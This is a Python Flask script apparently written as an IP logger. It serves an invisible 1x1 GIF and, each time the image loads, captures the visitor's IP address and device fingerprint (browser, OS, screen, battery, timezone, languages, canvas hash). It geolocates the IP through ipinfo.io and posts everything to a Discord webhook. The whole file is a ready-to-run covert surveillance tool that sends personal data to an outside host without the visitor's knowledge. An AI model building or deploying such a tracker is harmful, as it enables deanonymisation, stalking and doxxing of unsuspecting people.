import os
from flask import Flask, request, send_file
import requests 
from datetime import datetime
import io
import json

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')

# 1x1 pixel ki transparent GIF image
PIXEL_BYTES = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

@app.route('/log')
def track():
    if not DISCORD_WEBHOOK_URL:
        return "Error: Discord Webhook URL not configured on the server.", 500

    # --- Step 1: Saare Parameters ko Capture Karna ---
    # Basic Info
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    username = request.args.get('username', 'Guest')
    avatar_url = request.args.get('avatar', '')
    
    # Behavior Info
    visitor_type = "Returning Visitor ♻️" if request.args.get('isNew') == 'false' else "New Visitor ✨"
    referrer = request.headers.get('Referer', 'Direct Visit')

    # Device Fingerprint
    screen_res = request.args.get('screen', 'N/A')
    os_type = request.args.get('os', 'N/A')
    browser = request.args.get('browser', 'N/A')
    battery_level = request.args.get('battery', 'N/A')
    is_charging = request.args.get('charging', 'N/A')
    is_touch = 'Yes' if request.args.get('touch') == 'true' else 'No'
    
    # Advanced Info
    timezone = request.args.get('timezone', 'N/A').replace('_', ' ')
    languages = request.args.get('langs', 'N/A')
    ad_blocker = 'Detected 🛡️' if request.args.get('adBlock') == 'true' else 'Not Detected 🟢'
    network_speed = request.args.get('speed', 'N/A')
    canvas_hash = request.args.get('canvas', 'N/A')
    
    # --- Step 2: Geolocation (Pehle jaisa) ---
    geo_info = "Not available"
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            data = response.json()
            city, region, country_code, isp = data.get('city', 'N/A'), data.get('region', 'N/A'), data.get('country', 'N/A'), data.get('org', 'N/A')
            flag_emoji = "".join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code and country_code != 'N/A' else ""
            geo_info = f"**City:** {city}\n**Country:** {flag_emoji} {country_code}\n**ISP:** {isp}"
    except Exception: pass

    # --- Step 3: Final Discord Embed Banana ---
    embed = {
        "title": f"Holland Card: {visitor_type}",
        "description": f"**Username:** `{username}`\n**IP Address:** `{ip_address}`",
        "color": 2895667, # Green for new, or another color
        "author": {
            "name": f"{os_type} | {browser}",
            "icon_url": "https://i.imgur.com/vRxL42Y.png" # Generic OS icon
        },
        "fields": [
            {"name": "📍 Location & ISP", "value": geo_info, "inline": True},
            {"name": "🌐 Network", "value": f"**Speed:** {network_speed} Mbps\n**Timezone:** {timezone}\n**AdBlocker:** {ad_blocker}", "inline": True},
            {"name": "💻 Device & Screen", "value": f"**Screen:** {screen_res}\n**Battery:** {battery_level} (Charging: {is_charging})\n**Touch:** {is_touch}", "inline": False},
            {"name": "🕵️ Advanced Fingerprint", "value": f"**Languages:** `{languages}`\n**Referrer:** `{referrer}`\n**Canvas Hash:** `{canvas_hash}`", "inline": False},
        ],
        "thumbnail": {"url": avatar_url},
        "footer": {"text": f"Logged at {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC | Logger v5.0"},
    }

    # Headers ko ek alag message mein bhejenge, agar zaroorat ho to
    # headers_dict = dict(request.headers)
    # headers_pretty = json.dumps(headers_dict, indent=2)

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Error sending to Discord: {e}")

    return send_file(io.BytesIO(PIXEL_BYTES), mimetype='image/gif')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
